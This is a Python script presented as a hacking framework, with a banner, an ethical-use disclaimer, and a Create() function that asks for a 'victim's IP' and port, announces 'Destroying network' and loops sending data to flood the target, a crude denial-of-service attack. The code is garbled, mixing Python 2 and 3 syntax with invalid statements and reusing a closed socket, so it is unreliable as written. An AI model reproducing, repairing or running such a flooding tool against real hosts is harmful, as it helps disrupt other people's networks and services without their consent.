import socket
import datetime
import time
import os
import miniupnpc
import nmap

"""
COPYRIGHTED UNDER GPLV3+

AUTHOR: PARSA ZARRIN

DESCRIPTION:

I AM NOT RESPONSIBLE FOR ANY ILLEGAL USAGE FOR THIS FRAMEWORK, IT IS INTENDED FOR ETHICAL USAGE ONLY WITH 
ACKNOWLEDGEMENT OF 
ALL CLIENTS, THIS IS THE SHARED VERSION THAT ANY MAY BE ALLOWED TO MODIFY, THE ACTUAL FRAMEWORK SOON TO BE COPYRIGHTED
UNDER ACT 1968 IS WRITTEN IN C AND C++ ALONG JAVA. ANY ILLEGAL USAGE AS SAID MEANS YOU ARE AT FAULT AND NOT THE AUTHOR

THIS SOFTWARE ALLOWS HACKERS TO TEST ALL  VULNEBILITIES IN A SYSTEM.
THANK YOU FOR READING.
~Parsa Zarrin
"""




print("""


 _____  _      _____  ______  _____   _   _    ______ _____ __   __
|_   _|| |    |____ | |  _  \|____ | | | | |  |___  /|  _  |\ \ / /
  | |  | |__      / / | | | |    / // __)| |_    / / | |/' | \ V / ___  _ __
  | |  | '_ \     \ \ | | | |    \ \\__ \| __|  / /  |  /| |  \ / / _ \| '__|
  | |  | | | |.___/ / | |/ / .___/ /(   /| |_ ./ /   \ |_/ /  | ||  __/| |
  \_/  |_| |_|\____/  |___/  \____/  |_|  \__|\_/     \___/   \_/ \___||_|



""" , end=" ")

#class TheDestroyer(self):
    #"""docstring for ."""

#    def __init__(self):
#        self.IP = IP
    #    self.crawl = crawl
#    def Crawler(self):
#        self.crawl = raw_input("Enter the site to crawl->")

"""
THE FOLLOWING SOURCE CODE IS OUT OF DATE,


EXPECT AN UPDATE SHORTLY WITHIN A SIX MONTH PERIOD




"""
def Create():
    dos = socket.socket(socket.AF_INET ,socket.SOCK_STREAM)
    vic =  raw_input("Enter in the victim's IP->\t")
    port = input("Enter the port number, HTTP or HTTPS/FTP/NETBIOS")
    datetime.datetime.now()
    dos.connect((vic , port))
    for Pport in port:
        (print "[!]The targeted ports" + Pport)
        dos.connect_ex((vic, port))
        dos.close()
        if dos != 1:
            print ("[-]Port closed: " + Pport)
        elif dos == 1:
            print ("Port open:" + Pport)
            return 1


    print "Victim information below:\n"
    print(socket.getaddrinfo(vic, port))
    print "[!] Your information" , socket.gethostname()
    print "[+]Destroying network" , vic
    while True:
        dos.send("500")
        dos.recvfrom(66563)
        dos.close()
	if dos.recvfrom(1024):
		print "[+]WARNING, IDS DETECTED SHUTTING DOWN"

def warn():
    u = miniupnpc.UPnP()
    u.discoverdelay = 200
    u.discover()
    u.selectigd()
    print('external ip address: {}'.format(u.externalipaddress()))
    print(
    """
    I am not responsible for misusage and/or illegal activities done within your enviroment
    This tool is created to aid professinals and/or to educate others.

    """
    )
#def Scanner():
    #ip = raw_input("->\t")
    #port = raw_input("->\t")
    #sc = nmap.PortScanner()
    #sc.scan((sc , port))
    #print(nm.command_line())
    #for nap in nm:
    #    print nap
    #    print nap.hostname()
#Scanner()
warn()
Create()
